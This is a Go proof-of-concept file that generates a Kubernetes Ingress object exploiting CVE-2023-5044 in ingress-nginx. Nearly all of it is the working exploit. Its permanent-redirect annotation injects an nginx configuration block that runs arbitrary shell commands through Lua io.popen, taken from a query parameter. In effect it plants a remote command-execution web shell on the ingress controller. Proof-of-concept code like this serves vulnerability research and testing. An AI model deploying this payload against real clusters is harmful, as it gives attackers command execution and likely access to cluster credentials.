package poc

import (
	"fmt"
	"time"

	networkingv1 "k8s.io/api/networking/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func Generate(namespace string, namePrefix string, redirectPath string, closeItOffPath string, exploitCommand string) *networkingv1.Ingress {
	// Thank you Rory McCune for the steer - https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/
	exploitStr := fmt.Sprintf(`https://www.4armed.com;}location ~* "^/%s(/|$)(.*)" {content_by_lua 'ngx.say(io.popen(ngx.unescape_uri(ngx.var.arg_cmd)):read("*a"))';}location ~* "^/%s" { return 404 'pwned'`, redirectPath, closeItOffPath)

	annotations := map[string]string{
		"kubernetes.io/ingress.class":                    "nginx",
		"nginx.ingress.kubernetes.io/permanent-redirect": exploitStr,
	}

	pt := networkingv1.PathTypePrefix

	// Create an ingress object pointing at the Kubernetes service. This won't work unless you use HTTPS but it doesn't
	// matter. We don't need to use it, it just saves us having to deploy pod and service.
	return &networkingv1.Ingress{
		TypeMeta: metav1.TypeMeta{
			Kind:       "Ingress",
			APIVersion: "networking.k8s.io/v1",
		},
		ObjectMeta: metav1.ObjectMeta{
			GenerateName: namePrefix,
			Namespace:    namespace,
			Annotations:  annotations,
		},
		Spec: networkingv1.IngressSpec{
			Rules: []networkingv1.IngressRule{{
				IngressRuleValue: networkingv1.IngressRuleValue{
					HTTP: &networkingv1.HTTPIngressRuleValue{
						Paths: []networkingv1.HTTPIngressPath{{
							PathType: &pt,
							Path:     fmt.Sprintf("/doesnotmatter%d", time.Now().UnixNano()),
							Backend: networkingv1.IngressBackend{
								Service: &networkingv1.IngressServiceBackend{
									Name: "kubernetes",
									Port: networkingv1.ServiceBackendPort{
										Number: 443,
									},
								},
							},
						}},
					},
				},
			}},
		},
	}
}
